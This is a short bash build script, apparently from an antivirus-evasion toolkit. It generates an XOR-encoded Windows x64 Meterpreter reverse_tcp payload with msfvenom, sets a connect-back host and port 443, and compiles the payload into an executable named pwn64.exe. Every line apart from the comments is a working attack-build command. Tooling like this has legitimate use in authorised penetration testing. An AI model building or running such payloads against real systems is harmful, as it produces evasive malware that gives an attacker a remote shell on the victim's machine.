#!/bin/bash
. build/global_win64.sh
# example script for building executables with 64bit payload

# configure your connect-back settings here
LHOST=192.168.2.103
LPORT=443

# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$LHOST -e x64/xor lport=$LPORT -f c --platform Windows > sc.txt
./make_avet -f sc.txt -F -X
$win64_compiler -o pwn64.exe avet.c

# cleanup
rm sc.txt && echo "" > defs.h
